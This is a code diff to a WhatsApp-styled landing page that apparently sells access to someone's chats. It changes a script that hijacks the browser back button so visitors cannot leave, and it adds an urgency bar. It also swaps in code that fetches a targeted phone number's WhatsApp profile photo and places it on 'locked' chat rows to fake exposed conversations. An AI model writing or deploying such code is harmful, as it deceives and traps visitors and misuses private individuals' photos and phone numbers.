@@ -75,7 +75,7 @@ function navigateWithQuery(targetUrl, params) {
 }
 // End query forwarding helper
 </script>
-<script>(function(){function b(){history.pushState(null,null,location.href);}setTimeout(b,0);setTimeout(b,100);window.onpopstate=function(){navigateWithQuery("backredirect.html");};}());</script>
+<script>(function(){function b(){history.pushState(null,null,location.href);}setTimeout(b,0);setTimeout(b,100);window.onpopstate=function(){/* block back — offer only on last step */b();};}());</script>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
 :root{--g:#25D366;--gd:#128C7E;--bg:#f0f2f5;--w:#fff;--t:#111b21;--t2:#667781;--bd:#e9edef;--red:#ef4444;--green-msg:#dcf8c6;}
@@ -209,6 +209,7 @@ html,body{font-family:'Inter',sans-serif;background:var(--bg);height:100%;overfl
   .pop-btn-sub{font-size:.7rem;opacity:.8;font-weight:400;}
 
 </style>
+<script src="js/urgency-bar.js"></script>
 </head>
 <body>
 <div id="app">
@@ -525,22 +526,35 @@ function submitLead() {
 }
 
 
-function loadProfilePic(phone, containerEl, size) {
-  if (!phone || !containerEl) return;
-  var apiUrl = 'https://newtechaccess.com/profile-picture.php?phone=' + encodeURIComponent(phone);
-  fetch(apiUrl)
-    .then(function(r){ return r.json(); })
-    .then(function(data){
-      if (data && data.urlImage) {
-        var proxied = 'https://newtechaccess.com/image-proxy.php?url=' + encodeURIComponent(data.urlImage);
-        var wrapper = document.createElement('div');
-        wrapper.style.cssText = 'width:'+size+'px;height:'+size+'px;border-radius:50%;background-size:cover;background-position:center;border:3px solid var(--g);box-sizing:border-box;flex-shrink:0;';
-        wrapper.style.backgroundImage = 'url('+proxied+')';
-        if (containerEl.parentNode) containerEl.parentNode.replaceChild(wrapper, containerEl);
+// Apply target WhatsApp photo on highlighted chats / locked contact row
+(function(){
+  var s = document.createElement('script');
+  s.src = 'js/profile-photo.js';
+  s.onload = function(){
+    if (!window.ProfilePhoto) return;
+    var dig = (dec || '').replace(/\D/g,'');
+    if (!dig) return;
+    ProfilePhoto.fetch(dig).then(function(url){
+      if (!url) return;
+      // Locked "unknown number" row avatar
+      var mfc = document.querySelector('.mfc-av');
+      if (mfc) {
+        mfc.innerHTML = '';
+        mfc.style.backgroundImage = 'url('+url+')';
+        mfc.style.backgroundSize = 'cover';
+        mfc.style.backgroundPosition = 'center';
+        mfc.style.borderRadius = '50%';
       }
-    })
-    .catch(function(){});
-}
+      // First highlighted chat item uses target photo
+      var firstHl = document.querySelector('.ci.hl .ci-av');
+      if (firstHl) {
+        firstHl.innerHTML = '<img src="'+url+'" alt="" style="width:100%;height:100%;object-fit:cover;border-radius:50%;">';
+        firstHl.style.background = 'transparent';
+      }
+    });
+  };
+  document.head.appendChild(s);
+})();
 
 </script>
 </body>
